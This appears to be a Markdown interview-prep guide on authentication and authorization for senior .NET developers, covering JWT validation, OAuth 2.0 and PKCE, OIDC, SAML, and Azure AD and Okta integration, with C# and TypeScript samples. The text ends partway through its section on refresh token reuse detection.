# Authentication & Authorization — Senior .NET Interview Guide

Audience: 10+ year .NET full-stack developer prepping for senior/lead interviews. Fundamentals assumed; focus is on nuance, trade-offs, "why", gotchas, and follow-ups.

## Table of Contents

- [1. Core Concepts](#1-core-concepts)
  - [1.1 Authentication vs Authorization](#11-authentication-vs-authorization)
  - [1.2 Stateful Sessions vs Stateless Tokens](#12-stateful-sessions-vs-stateless-tokens)
  - [1.3 Basic Authentication (Legacy)](#13-basic-authentication-legacy)
  - [1.4 What JWT Actually Is](#14-what-jwt-actually-is)
  - [1.5 JWT Anatomy — Header, Payload, Signature](#15-jwt-anatomy--header-payload-signature)
  - [1.6 Claims: Registered, Public, Private](#16-claims-registered-public-private)
- [2. Intermediate](#2-intermediate)
  - [2.1 Signing Algorithms: HS256 vs RS256 vs ES256](#21-signing-algorithms-hs256-vs-rs256-vs-es256)
  - [2.2 Where JWTs Live in HTTP & Storage Trade-offs](#22-where-jwts-live-in-http--storage-trade-offs)
  - [2.3 Access Tokens vs Refresh Tokens](#23-access-tokens-vs-refresh-tokens)
  - [2.4 Full Login → API → Refresh Flow](#24-full-login--api--refresh-flow)
  - [2.5 JWT Validation — What Actually Happens Internally](#25-jwt-validation--what-actually-happens-internally)
  - [2.6 Claims vs Roles vs Policy-Based Authorization](#26-claims-vs-roles-vs-policy-based-authorization)
  - [2.7 [new content] The 7 ASP.NET Core Authorization Styles](#27-new-content-the-7-aspnet-core-authorization-styles)
- [3. Advanced](#3-advanced)
  - [3.1 OAuth 2.0 — Roles, Flows, and Grant Types](#31-oauth-20--roles-flows-and-grant-types)
  - [3.2 [new content] OAuth2 Grant Types: Which Are Deprecated/Unsafe](#32-new-content-oauth2-grant-types-which-are-deprecatedunsafe)
  - [3.3 PKCE — Why It's Now Mandatory Even for Confidential Clients](#33-pkce--why-its-now-mandatory-even-for-confidential-clients)
  - [3.4 OAuth 2.0 vs OpenID Connect vs JWT](#34-oauth-20-vs-openid-connect-vs-jwt)
  - [3.5 [new content] SAML vs OIDC for SSO/Federation](#35-new-content-saml-vs-oidc-for-ssofederation)
  - [3.6 Azure AD (Entra ID) + Angular MSAL Implementation](#36-azure-ad-entra-id--angular-msal-implementation)
  - [3.7 Okta PKCE + Refresh Token + .NET API Implementation](#37-okta-pkce--refresh-token--net-api-implementation)
  - [3.8 [new content] Refresh Token Rotation & Reuse Detection](#38-new-content-refresh-token-rotation--reuse-detection)
  - [3.9 [new content] Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser](#39-new-content-securing-spa-to-api-auth-bff-pattern-vs-token-in-browser)
  - [3.10 [new content] ASP.NET Core Identity Customization](#310-new-content-aspnet-core-identity-customization)
  - [3.11 [new content] Multi-Tenant Authentication & Authorization](#311-new-content-multi-tenant-authentication--authorization)
- [4. Security & Performance](#4-security--performance)
  - [4.1 Why JWT Revocation Is Hard — and the Real Strategies](#41-why-jwt-revocation-is-hard--and-the-real-strategies)
  - [4.2 [new content] Opaque Tokens vs JWT for Revocation — the Real Trade-off](#42-new-content-opaque-tokens-vs-jwt-for-revocation--the-real-trade-off)
  - [4.3 [new content] JWT Validation Pitfalls: Algorithm Confusion & alg:none](#43-new-content-jwt-validation-pitfalls-algorithm-confusion--algnone)
  - [4.4 CSRF, XSS, and Session Fixation — How They Interact With Auth](#44-csrf-xss-and-session-fixation--how-they-interact-with-auth)
  - [4.5 [new content] mTLS for Service-to-Service Auth](#45-new-content-mtls-for-service-to-service-auth)
  - [4.6 [new content] API Keys vs OAuth Client Credentials for Machine-to-Machine](#46-new-content-api-keys-vs-oauth-client-credentials-for-machine-to-machine)
  - [4.7 Performance Considerations](#47-performance-considerations)
- [5. Best Practices](#5-best-practices)
- [6. Common Pitfalls](#6-common-pitfalls)
  - [6.1 JWT Pitfalls](#61-jwt-pitfalls)
  - [6.2 OAuth Pitfalls](#62-oauth-pitfalls)
  - [6.3 Refresh Token Pitfalls](#63-refresh-token-pitfalls)
- [7. Implementation Reference (C#)](#7-implementation-reference-c)
- [8. Sample Interview Q&A](#8-sample-interview-qa)
- [Summary of Additions](#summary-of-additions)

---

## 1. Core Concepts

### 1.1 Authentication vs Authorization

| | Authentication | Authorization |
|---|---|---|
| Answers | Who are you? | What can you do? |
| Mechanism | Login process (credentials, token, certificate) | Claims / roles / policies evaluated against a resource |
| ASP.NET Core middleware | `UseAuthentication()` populates `HttpContext.User` | `UseAuthorization()` evaluates `[Authorize]` requirements |
| Failure result | `401 Unauthorized` | `403 Forbidden` |
| Example | User logs in | User (logged in) tries to hit an admin-only endpoint |

**Interviewer follow-up:** *"Why does my API return 401 when I expected 403?"* — Usually means the authentication handler never populated a valid principal (missing/invalid/expired token), so the pipeline never got far enough to evaluate authorization. If you get 403, authentication succeeded but the policy/role check failed.

### 1.2 Stateful Sessions vs Stateless Tokens

Two broad approaches to "remember" a user across requests:

**A) Stateful sessions (classic)**
- User logs in; server stores a session record (memory/Redis/DB): `sessionId -> userId, roles, expiry`.
- Client stores only a random `sessionId` cookie; every request sends it; server looks it up.
- **Pros:** easy revocation, server controls truth.
- **Cons:** server must store and scale session state.

**B) Stateless tokens (JWT is the common format)**
- Server issues a token containing claims about the user; client sends it every request; server verifies cryptographically, no session storage.
- **Pros:** horizontally scalable, no central session store.
- **Cons:** revocation is harder; requires careful security design.

```mermaid
flowchart LR
    subgraph Stateful["Stateful Session"]
    A1[Client] -- sessionId cookie --> A2[Server]
    A2 -- lookup --> A3[(Session Store\nRedis/DB)]
    end
    subgraph Stateless["Stateless JWT"]
    B1[Client] -- JWT --> B2[Server]
    B2 -- verify signature\nno DB call --> B2
    end
```

JWT is just one common **format** used inside the stateless approach — not a synonym for it.

### 1.3 Basic Authentication (Legacy)

Sends `username:password` Base64-encoded on **every** request:

```
Authorization: Basic dXNlcjpwYXNzd29yZA==
```

- **How it works:** client encodes `username:password` in Base64; server decodes and validates on every call.
- **Advantages:** trivial to implement, universally supported, fine for legacy/internal system-to-system calls behind a VPN.
- **Risks:** credentials sent on every request; Base64 is *encoding*, not encryption — anyone intercepting traffic gets the raw password; no expiry, no revocation; vulnerable to replay if TLS is ever downgraded or terminated somewhere untrusted.

**Why it must always run over HTTPS:** because credentials are only Base64-encoded, not encrypted — if the transport isn't encrypted, credentials are trivially recoverable in transit (by anyone on the network path, proxy logs, etc.). It is considered insecure because credentials travel on every request with no expiration/revocation, and a captured request can be replayed indefinitely. Legacy/internal systems still use it purely for compatibility where modern auth isn't supported.

**Replay attack (definition):** an attacker captures a valid authenticated request or token and resends it later to gain unauthorized access without ever knowing the underlying credentials. Basic Auth (and any bearer scheme without freshness checks) is inherently susceptible unless mitigated by TLS + short-lived credentials + nonces for sensitive operations.

### 1.4 What JWT Actually Is

JWT (JSON Web Token) is a compact, URL-safe string format representing a set of JSON claims. It can be:
- **Signed** (most common) → recipients verify authenticity + integrity. This is technically a **JWS** (JSON Web Signature).
- **Encrypted** (less common) → content confidentiality. This is a **JWE** (JSON Web Encryption).

JWT belongs to the broader **JOSE** family of specs:

| Spec | Meaning |
|---|---|
| JWS | JSON Web Signature — signed JWT |
| JWE | JSON Web Encryption — encrypted JWT |
| JWK | JSON Web Key — key representation format |
| JWA | JSON Web Algorithms — algorithm names (`HS256`, `RS256`, etc.) |

Most people say "JWT" but mean **JWS** (a signed, non-encrypted token).

**Critical misconception to correct in an interview:** *a signed JWT is not secret.* Anyone holding it can Base64URL-decode the payload and read it. Signed JWT gives you:
- **Integrity** — payload can't be altered without invalidating the signature.
- **Authenticity** — you can verify who issued it (holder of the private/shared key).

It does **not** give confidentiality. If you need that: use JWE, avoid putting sensitive data in the token at all, or use opaque tokens + introspection.

A URL-safe token uses **Base64URL** encoding (not standard Base64): `+`→`-`, `/`→`_`, padding (`=`) often omitted. This avoids characters with special meaning in URLs, so JWTs can be passed in URLs/headers/cookies without extra escaping. Again — encoding is not security.

### 1.5 JWT Anatomy — Header, Payload, Signature

A signed JWT: `xxxxx.yyyyy.zzzzz` — three Base64URL-encoded segments separated by dots.

**Header (JSON):**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2026-05"
}
```
- `alg`: algorithm used to sign (or encrypt).
- `typ`: usually `"JWT"` (often omitted).
- `kid`: key ID — tells the verifier *which* public key (from a JWKS set) to use.

**Payload (claims):**
```json
{
  "iss": "https://auth.mycompany.com",
  "aud": "my-api",
  "sub": "user_123",
  "exp": 1760000000,
  "iat": 1759996400,
  "nbf": 1759996400,
  "scope": "orders:read orders:write",
  "role": "admin"
}
```

**Signature:** computed over `base64url(header) + "." + base64url(payload)` using the algorithm named in `alg`. If it verifies, you know the header+payload are exactly what the issuer signed — nothing more, nothing less.

```mermaid
flowchart TB
    H["Header (JSON)\nalg, typ, kid"] --> B64H["Base64URL"]
    P["Payload (JSON claims)\niss, aud, sub, exp..."] --> B64P["Base64URL"]
    B64H --> CONCAT["base64url(header) + '.' + base64url(payload)"]
    B64P --> CONCAT
    CONCAT --> SIGN["Sign with alg + key"]
    SIGN --> JWT["Header.Payload.Signature"]
```

### 1.6 Claims: Registered, Public, Private

**Registered (standard) claims:**

| Claim | Meaning |
|---|---|
| `iss` | Issuer — who issued the token |
| `sub` | Subject — who the token is about (often user id) |
| `aud` | Audience — intended recipient(s) (your API) |
| `exp` | Expiry — UNIX timestamp |
| `iat` | Issued at |
| `nbf` | Not-before — token not valid before this time |
| `jti` | JWT ID — unique token id, useful for revocation lists |

**Public claims:** globally unique/collision-resistant names (often URIs) so unrelated parties don't clash.

**Private claims:** your own application fields, e.g. `"employeeId"`, `"tenantId"`, `"Department"`.

---

## 2. Intermediate

### 2.1 Signing Algorithms: HS256 vs RS256 vs ES256

This is a very common deep-dive area.

**HS256 (HMAC-SHA256) — symmetric**
- Same secret signs *and* verifies.
- Any service that can verify a token must hold the secret — if it leaks, that party (or an attacker who steals it) can *mint* valid tokens, not just read them.
- Good for: single authority, tightly controlled set of services.
- Risky for: many services/clients needing to verify tokens (secret sprawl).

**RS256 (RSA) — asymmetric**
- Private key signs; public key verifies.
- APIs only need the public key — safer distribution, no shared secret.
- Good for: microservices, third-party verification, publishing a JWKS endpoint.

**ES256 (ECDSA) — asymmetric**
- Same asymmetric split as RS256, but smaller keys/tokens and often faster verification.
- Slightly more operational friction in some ecosystems (library/HSM support).

**Rule of thumb:** use RS256/ES256 for access tokens whenever more than one service verifies them. Use HS256 only if you fully control every verifier and can protect the shared secret.

| | HS256 | RS256 | ES256 |
|---|---|---|---|
| Key type | Symmetric | Asymmetric | Asymmetric |
| Who can verify | Anyone with the secret (can also forge) | Anyone with public key (cannot forge) | Anyone with public key (cannot forge) |
| Best for | Single-service/monolith | Multi-service/microservices | Multi-service, size/perf sensitive |
| Key distribution risk | High (secret must reach every verifier) | Low (public key only) | Low (public key only) |

### 2.2 Where JWTs Live in HTTP & Storage Trade-offs

Most common: `Authorization: Bearer <token>`. Alternative: cookie-based (HttpOnly Secure cookie), especially for browser apps.

**Browser storage options:**

| Storage | Readable by JS? | XSS risk | CSRF risk | Notes |
|---|---|---|---|---|
| `localStorage` | Yes | High — any injected script can read it | None (not auto-sent) | Easiest to implement, worst security posture |
| `sessionStorage` | Yes | High — same as above | None | Cleared on tab close; still XSS-vulnerable |
| HttpOnly cookie | No | Low — JS can't read it | Yes — must add CSRF protection | Best default for browser-facing apps |

There's no universally "perfect" answer — it depends on app type and threat model. For SPA + API, many teams prefer HttpOnly cookies + CSRF protection, or a BFF pattern (see [3.9](#39-new-content-securing-spa-to-api-auth-bff-pattern-vs-token-in-browser)) that keeps tokens off the browser entirely.

### 2.3 Access Tokens vs Refresh Tokens

| Aspect | Access Token | Refresh Token |
|---|---|---|
| Purpose | Access APIs | Obtain a new access token |
| Lifetime | Short (5–30 min) | Long (days/weeks) |
| Stored | Client memory / short-lived cookie | Secure storage (HttpOnly cookie, encrypted DB row) |
| Sent to API | Yes, every request | No — only to the token/auth endpoint |
| Revocable | Hard (stateless) | Easy (server-side record) |
| Risk if stolen | Limited (short window) | High (long window) unless rotation + reuse detection is in place |
| Typical format | JWT | Usually **opaque** random string, not JWT |

**One-liner:** Access token is short-lived and used to call APIs; refresh token is long-lived and used to obtain new access tokens without forcing re-login.

**Why refresh tokens are usually opaque, not JWT:** you want easy server-side revocation and rotation tracking — an opaque token is just a lookup key into a DB/Redis record you fully control, with no self-contained claims to go stale.

### 2.4 Full Login → API → Refresh Flow

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant API as Resource API

    C->>AS: POST /login (credentials)
    AS->>AS: Validate credentials
    AS-->>C: Access Token (JWT) + Refresh Token (opaque)
    C->>API: GET /orders (Authorization: Bearer <access token>)
    API->>API: Validate signature, iss, aud, exp
    API-->>C: 200 OK (data)
    Note over C,API: ...time passes, access token expires...
    C->>AS: POST /refresh (refresh token)
    AS->>AS: Validate refresh token, rotate it
    AS-->>C: New Access Token + New Refresh Token (old one invalidated)
```

Rotation means: every refresh generates a brand-new refresh token, and the old one becomes invalid — this helps *detect* theft (see [3.8](#38-new-content-refresh-token-rotation--reuse-detection)).

### 2.5 JWT Validation — What Actually Happens Internally

A correct verifier does **far more** than "check the signature". This is one of the highest-value interview answers you can give because most candidates stop at "verify signature and expiry."

1. **Parse** header + payload — don't trust any field yet.
2. **Select the key safely:**
   - For RS256/ES256, pick the public key by `kid` from a **trusted, pre-configured** JWKS endpoint.
   - **Never** fetch keys from a URL that the token itself points to (classic `jku`/`x5u` header injection attack).
3. **Verify the signature** using the algorithm *you* configured server-side — never the algorithm the token claims to use (see [4.3](#43-new-content-jwt-validation-pitfalls-algorithm-confusion--algnone)).
4. **Validate standard claims:**
   - `exp` in the future (allow small clock skew, e.g. 1–2 minutes).
   - `nbf` ≤ now.
   - `iss` equals the expected issuer.
   - `aud` includes your API's audience identifier.
5. **Authorize:** check scopes/roles/permissions claims against the requested resource.
6. **Optional but common hardening:**
   - Check `jti` against a revocation list.
   - Check a `tenantId` claim matches the request's tenant context (multi-tenant apps).
   - Check a `typ`/`token_use` claim so a refresh token can't be replayed as an access token.

**Key idea to say out loud in an interview:** *the signature proves the issuer created this token; claims validation proves it's meant for me and still valid.* Both are required — a candidate who only mentions the signature is giving an incomplete answer.

Once validated, claims are materialized into `HttpContext.User` (a `ClaimsPrincipal`) for the authorization stage to consume.

### 2.6 Claims vs Roles vs Policy-Based Authorization

**Role:** simple grouping — `Admin`, `User`, `Manager`.
**Claim:** key-value pair — `Department=Finance`, `Country=IN`.
**Policy:** a named, centrally-registered rule built from claims, roles, and/or custom logic.

| Feature | Role-based | Claims-based | Policy-based |
|---|---|---|---|
| Flexibility | Low | High | Highest |
| Granularity | Coarse | Fine-grained | Fine-grained + composable |
| Scalability | Limited (role explosion: `AdminForRegionX`, `AdminForRegionY`...) | Highly scalable | Highly scalable, centralized |
| Where logic lives | Scattered `[Authorize(Roles=...)]` attributes | Scattered `[Authorize]` + manual claim checks | Centralized in `AddAuthorization()` — one source of truth |
| Real-world usage | Small apps, simple hierarchies | Enterprise apps needing attribute-based access | Enterprise apps, especially with dynamic/custom rules |

```csharp
// Role-based
[Authorize(Roles = "Admin")]

// Claims-based (ad hoc, inline)
if (!User.HasClaim("Department", "IT")) return Forbid();

// Policy-based (centralized, reusable, testable)
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ITOnly", policy => policy.RequireClaim("Department", "IT"));
});

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

**Why claims/policies scale better than roles:** roles are coarse and tend to multiply combinatorially as requirements get more specific (`RegionAdmin`, `FinanceRegionAdmin`...). Claims let you express attributes independently and combine them in policies without exploding the role table. Policies additionally centralize the *decision logic* so it isn't duplicated across controllers — critical for auditability in a senior-level system.

**Policy pitfalls:** overly complex policies with nested requirements become hard to unit test and debug (a failed policy just returns 403 with little diagnostic detail by default) — mitigate with custom `IAuthorizationHandler`s that log *why* a requirement failed, and keep policies small and composable rather than monolithic.

### 2.7 [new content] The 7 ASP.NET Core Authorization Styles

Your notes listed these as a bare enumeration with no explanation. Here's the complete picture, since interviewers often ask "which authorization models does ASP.NET Core support and when do you reach for each":

1. **Simple authorization** — `[Authorize]` with no parameters; just requires an authenticated user.
2. **Role-based authorization** — `[Authorize(Roles = "Admin,Manager")]`; checks `ClaimTypes.Role` claims.
3. **Policy-based authorization** — named policies registered once, referenced via `[Authorize(Policy = "...")]`; the recommended default for anything beyond trivial checks.
4. **Claims-based authorization** — `RequireClaim(...)` inside a policy, or manual `User.HasClaim(...)` checks; finer-grained than roles.
5. **Custom requirement-based authorization** — implement `IAuthorizationRequirement` + `AuthorizationHandler<T>` for logic that can't be expressed declaratively (e.g. "user can only edit orders they created", "user's clearance level ≥ document's classification"). This is where **resource-based** checks usually live.
6. **Endpoint-specific authorization** — in Minimal APIs, `.RequireAuthorization("PolicyName")` chained onto route registration instead of an attribute; same underlying policy engine, different syntax surface for minimal API / endpoint routing style.
7. **Resource-based authorization** — `IAuthorizationService.AuthorizeAsync(User, resource, policy)` where the decision depends on the *specific object* being accessed, not just the user's claims (e.g., "can this user delete *this* document" requires loading the document first to check ownership). This is the mechanism you reach for once policy-based checks aren't enough because the rule depends on runtime data, not just the token.

```csharp
// Resource-based authorization example
public class DocumentAuthHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context, SameAuthorRequirement requirement, Document resource)
    {
        if (resource.OwnerId == context.User.FindFirstValue(ClaimTypes.NameIdentifier))
            context.Succeed(requirement);
        return Task.CompletedTask;
    }
}

// Usage in a controller
var result = await _authorizationService.AuthorizeAsync(User, document, "SameAuthorPolicy");
if (!result.Succeeded) return Forbid();
```

---

## 3. Advanced

### 3.1 OAuth 2.0 — Roles, Flows, and Grant Types

OAuth 2.0 is an **authorization framework** — it lets a user grant a third-party application access to their data *without sharing credentials*. It is not itself an authentication protocol (that's what OIDC layers on top — see [3.4](#34-oauth-20-vs-openid-connect-vs-jwt)).

**Four roles:**
- **Resource Owner** — the user who owns the data.
- **Client** — the application requesting access.
- **Authorization Server** — authenticates the resource owner and issues tokens.
- **Resource Server** — the API hosting protected resources.

**Authorization Code flow (the canonical example, e.g. "Login with Google"):**

1. User clicks "Login with Google".
2. App redirects to Google's authorization endpoint.
3. User authenticates and grants permission.
4. Google redirects back with an **authorization code**.
5. App exchanges the code for tokens (server-to-server call, includes client secret for confidential clients, or PKCE verifier for public clients).
6. App uses the **access token** to call the API; the API validates it and returns data.

```
GET https://accounts.google.com/o/oauth2/auth
    ?client_id=YOUR_CLIENT_ID
    &redirect_uri=https://yourapp.com/callback
    &response_type=code
    &scope=email profile
```

```
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

client_id=YOUR_CLIENT_ID
&client_secret=YOUR_CLIENT_SECRET
&code=AUTHORIZATION_CODE
&grant_type=authorization_code
&redirect_uri=https://yourapp.com/callback
```

```json
{
  "access_token": "ya29.a0AR...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "refresh_token": "1//0g..."
}
```

### 3.2 [new content] OAuth2 Grant Types: Which Are Deprecated/Unsafe

Your notes only mentioned Authorization Code and Client Credentials in passing. Senior interviews frequently probe the *entire* grant-type landscape and which ones you should never reach for in 2026:

| Grant type | Status | Use case | Why / why not |
|---|---|---|---|
| Authorization Code (+ PKCE) | **Current standard** | Web apps, SPAs, mobile apps — any app with a user present | Code never exposes tokens in the URL/browser history; PKCE protects the code exchange even for public clients |
| Client Credentials | **Current standard** | Machine-to-machine, no user present (service calling service) | Client authenticates with its own secret/certificate; no user context at all |
| Refresh Token | **Current standard** | Silently obtaining a new access token | Should always be rotated; see [3.8](#38-new-content-refresh-token-rotation--reuse-detection) |
| Device Code | **Current standard** | Input-constrained devices (smart TVs, CLIs) | User authenticates on a second device via a short code |
| **Implicit** | **Deprecated — do not use** | Was: SPAs before PKCE existed | Returns the access token directly in the URL fragment — no code exchange, no client authentication, token exposed in browser history/referrer headers, no refresh token support. OAuth 2.1 removes it entirely. |
| **Resource Owner Password Credentials (ROPC)** | **Deprecated/discouraged** | Was: trusted first-party apps needing to collect username/password directly | Defeats the entire purpose of OAuth (app handles raw credentials); no support for MFA/federated login; OAuth 2.1 removes it. Only marginally acceptable for legacy migration scenarios with a fully trusted first-party client, and even then avoid it if possible. |

**Follow-up an interviewer will ask:** *"If implicit flow is dead, how do modern SPAs get tokens?"* — Authorization Code + PKCE, same as confidential clients, because PKCE removes the need for a client secret while still using the secure code-exchange model (see next section).

### 3.3 PKCE — Why It's Now Mandatory Even for Confidential Clients

**PKCE (Proof Key for Code Exchange, RFC 7636)** was originally designed to protect **public clients** (SPAs, mobile apps) that can't safely hold a client secret, by binding the authorization code to the client that requested it:

1. Client generates a random `code_verifier` and derives `code_challenge = BASE64URL(SHA256(code_verifier))`.
2. Authorization request includes `code_challenge` + `code_challenge_method=S256`.
3. Authorization server stores the challenge alongside the issued code.
4. Token exchange request includes the original `code_verifier`.
5. Server recomputes the hash and compares — if it doesn't match, the exchange is rejected.

This defeats **authorization code interception attacks**: even if an attacker intercepts the code (e.g., via a malicious app registering the same custom URI scheme on mobile, or a compromised network), they can't exchange it without the verifier, which never leaves the original client.

**Why OAuth 2.1 / current best practice (e.g. Azure AD, Okta) now recommends PKCE for confidential clients too** — not just public ones:
- Defense in depth: even a confidential client's authorization code could be intercepted at the redirect step (browser history, referrer leakage, logs); PKCE closes that gap regardless of client type.
- Simplifies guidance: "always use PKCE" is a simpler, more auditable rule than "use PKCE only for public clients" — fewer configuration decisions means fewer misconfigurations.
- It's cheap: there's no operational cost to adding it, and it composes cleanly with client secret/certificate auth for confidential clients (both checks apply).

```mermaid
sequenceDiagram
    participant App as SPA (public client)
    participant AS as Authorization Server
    participant API as Resource API

    App->>App: Generate code_verifier, derive code_challenge (S256)
    App->>AS: Authorization request + code_challenge
    AS->>App: Redirect with authorization code
    App->>AS: Token request: code + code_verifier
    AS->>AS: Recompute SHA256(code_verifier), compare to stored challenge
    AS-->>App: Access Token + ID Token (+ Refresh Token if offline_access)
    App->>API: Bearer <access_token>
    API-->>App: Protected data
```

### 3.4 OAuth 2.0 vs OpenID Connect vs JWT

These three are frequently conflated — a senior candidate should be able to cleanly separate them:

- **JWT** = a **token format** (how claims are packaged and signed).
- **OAuth 2.0** = an **authorization framework** (how a client gets and uses tokens to access a resource on a user's behalf).
- **OpenID Connect (OIDC)** = an **identity layer built on top of OAuth 2.0** — adds a standardized **ID Token** (always a JWT), a `/userinfo` endpoint, and standardized login semantics.

| | OAuth 2.0 | JWT |
|---|---|---|
| Purpose | Authorization protocol | Token format |
| Usage | Delegating access (e.g. Google login flow) | Authenticating/representing claims |
| Contains user data? | No, by itself (uses opaque or JWT access tokens) | Yes — self-contained |
| Requires a call to validate? | Depends — introspection for opaque tokens | No — cryptographic local validation |
| Best for | Third-party/delegated access, SSO | Stateless authentication payload |

In an OIDC flow you typically receive three tokens:

| Token | Purpose | Typical format |
|---|---|---|
| **ID Token** | Tells the *client app* who the user is | Always JWT |
| **Access Token** | Authorizes calls to a *resource API* | JWT or opaque |
| **Refresh Token** | Obtains new tokens without re-login | Usually opaque |

**The single most common mistake here, worth stating proactively in an interview:** using the **ID token** to call your API. ID tokens are for the *client* to establish identity locally — they are not meant for resource servers unless a system is explicitly designed that way (and even then, it's unusual). APIs should validate **access tokens**, whose `aud` claim is scoped to that API.

### 3.5 [new content] SAML vs OIDC for SSO/Federation

Not covered in the original notes at all, but a near-guaranteed topic in enterprise/senior interviews since many .NET shops still run SAML alongside OIDC (e.g., legacy enterprise SSO with ADFS, or B2B federation with partner IdPs).

| | SAML 2.0 | OpenID Connect |
|---|---|---|
| Token format | XML (signed assertions) | JWT (JSON) |
| Transport | Browser redirects/POST bindings, heavier XML payloads | Redirects with compact URL-safe tokens |
| Primary era/use case | Enterprise SSO, legacy IdPs (ADFS, Okta/Azure AD as SAML IdP), B2B federation | Modern web/mobile/SPA, API-first architectures |
| Mobile/SPA friendliness | Poor — XML parsing, larger payloads, not designed for native apps | Good — designed with mobile/SPA in mind (PKCE, etc.) |
| Logout | SAML Single Logout (SLO) — notoriously fragile across providers | OIDC RP-Initiated Logout — simpler but still has cross-browser/session edge cases |
| Developer ergonomics | Verbose, XML-signature edge cases (canonicalization attacks historically) | JSON, well-supported libraries, JWKS-based key rotation |
| When you still see it | Legacy enterprise apps, some B2B partner integrations that only speak SAML | Everything new |

**Interviewer angle:** *"Would you introduce SAML for a new project?"* — No, not by choice. You support it only when integrating with an existing enterprise IdP or partner that mandates it. New projects should default to OIDC. If you must bridge the two, an identity broker (Azure AD, Okta, Auth0, Keycloak) can accept SAML from an upstream IdP and present OIDC downstream to your app — this is a very common integration pattern worth naming explicitly.

### 3.6 Azure AD (Entra ID) + Angular MSAL Implementation

**Flow used:** Authorization Code Flow with PKCE.

**Architecture:**
```
Angular App → Azure AD Login Page
       | Authorization Code + PKCE
       v
Azure AD issues Access Token / ID Token
       |
       v
Angular calls .NET API with Bearer Token
```

**Setup steps:**
1. **Register the app** in Azure Portal → Entra ID → App registrations → New registration. Set redirect URI (`http://localhost:4200`), platform type = Single-page application (SPA). Save the **Application (Client) ID** and **Directory (Tenant) ID**.
2. **Configure API permissions** — add Microsoft Graph `User.Read`, grant admin consent as needed.
3. **(Optional) Expose the backend API** — set an Application ID URI (`api://<API_CLIENT_ID>`), add a scope (e.g. `access_as_user`).
4. **Install MSAL:** `npm install @azure/msal-browser @azure/msal-angular`.
5. **Configure MSAL** with `clientId`, `tenantId`, `redirectUri`; cache location `sessionStorage` is recommended; define a protected resource map covering Graph and your backend API. MSAL then automatically redirects to login, acquires tokens, attaches the `Authorization` header, and refreshes silently.
6. **Protect routes** with `MsalGuard`.
7. **Login/logout** via `loginRedirect()` / `logoutRedirect()`.
8. **Call the API** normally with `HttpClient` — an MSAL interceptor fetches the token and attaches the header automatically.
9. **Secure the .NET API** with Microsoft.Identity.Web, configuring `Instance`, `TenantId`, `ClientId`, `Audience` in `appsettings.json`. The API then validates tokens automatically via the OIDC metadata/JWKS endpoint.

**Common pitfalls (from source notes):**
- Wrong redirect URI.
- Missing admin consent.
- Incorrect/over-broad scopes.
- CORS misconfiguration.
- Using the deprecated implicit flow.
- Token audience mismatch (API rejects tokens issued for a different `aud`).

**Security best practices (from source notes):**
- Use Authorization Code + PKCE.
- Never manually store tokens (let MSAL manage its cache).
- HTTPS only.
- Limit scopes to least privilege.
- Enable conditional access policies.
- Monitor sign-in logs.

**Interview one-liner:** Angular uses MSAL to run Authorization Code + PKCE against Azure AD; MSAL's interceptor silently acquires and attaches the access token to outbound API calls, and the .NET API validates the token via Microsoft.Identity.Web middleware against Azure AD's published metadata/JWKS.

### 3.7 Okta PKCE + Refresh Token + .NET API Implementation

**Angular side (`@okta/okta-angular`, `@okta/okta-auth-js`):**

```typescript
const oktaAuth = new OktaAuth({
  issuer: 'https://YOUR_OKTA_DOMAIN/oauth2/default',
  clientId: 'YOUR_CLIENT_ID',
  redirectUri: window.location.origin + '/login/callback',
  scopes: ['openid', 'profile', 'email']
});
```

- `signInWithRedirect()` / `signOut()` drive the login/logout flow.
- `getAccessToken()` retrieves the current access token for API calls.
- An `HttpInterceptor` attaches `Authorization: Bearer <token>` automatically to outbound requests.

**Token flow:**
```mermaid
flowchart TD
    A[User clicks login] --> B[Angular generates code_verifier]
    B --> C[Creates code_challenge]
    C --> D[Redirect to Okta login]
    D --> E[User authenticates]
    E --> F[Okta returns Authorization Code]
    F --> G["Angular sends code + code_verifier"]
    G --> H["Okta issues Access Token, ID Token, Refresh Token"]
    H --> I[Access token used for API calls]
    I --> J[Access token expires]
    J --> K[Refresh token silently generates new access token]
```

**.NET API side** — validating Okta-issued tokens is just standard JWT bearer configuration pointed at Okta's Authority:

```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.Authority = "https://dev-12345.okta.com/oauth2/default";
        options.Audience = "api://default";
    });

builder.Services.AddAuthorization();
```

Setting `Authority` makes the middleware fetch OIDC discovery metadata (including the JWKS URI) automatically, so you never hard-code a public key — it's retrieved and cached, and rotates transparently as Okta rotates signing keys.

**Key concepts called out in source notes:**
- **PKCE** prevents authorization code interception attacks (see [3.3](#33-pkce--why-its-now-mandatory-even-for-confidential-clients)).
- **`offline_access` scope** is required to receive a refresh token at all — without it, the authorization server only issues access/ID tokens.
- **`autoRenew`** (an okta-auth-js config option) automatically refreshes the access token before it expires, transparently to the app.

### 3.8 [new content] Refresh Token Rotation & Reuse Detection

Your notes correctly listed "no refresh token rotation" as a pitfall, but didn't explain **reuse detection**, which is the mechanism senior interviewers actually want to hear about.

**Rotation** (already in your notes): every time a refresh token is used, the server issues a *new* refresh token and immediately invalidates the old one. This limits how long a stolen refresh token remains useful — but rotation alone doesn't *detect* theft, it just narrows the window.

**Reuse detection** is what turns rotation into a real security control:

1. Each refresh token, once used, is marked "consumed" (not just replaced) rather than simply deleted.
2. If a **consumed** refresh token is ever presented again, that's a strong signal of token theft — a legitimate client would only ever have the *latest* token, so a request bearing an old, already-rotated token means either (a) a race condition (rare, handle with a short grace window) or (b) an attacker replaying a stolen token while the legitimate user's flow has since rotated past it.
3. On detecting reuse, the server should **revoke the entire token family/session chain**, not just the one token — forcing full re-authentication. This limits the blast radius even if theft already happened.

```mermaid
sequenceDiagram
    participant U as Legitimate User
    participant A as Attacker (stole RT1)
    participant S as Auth Server

    U->>S: Refresh with RT1
    S->>S: Mark RT1 consumed, issue RT2
    S-->>U: New Access Token + RT2
    A->>S: Refresh with RT1 (stolen, already consumed)
    S->>S: Detect reuse of consumed token
    S->>S: Revoke entire token family (RT1, RT2, ...)
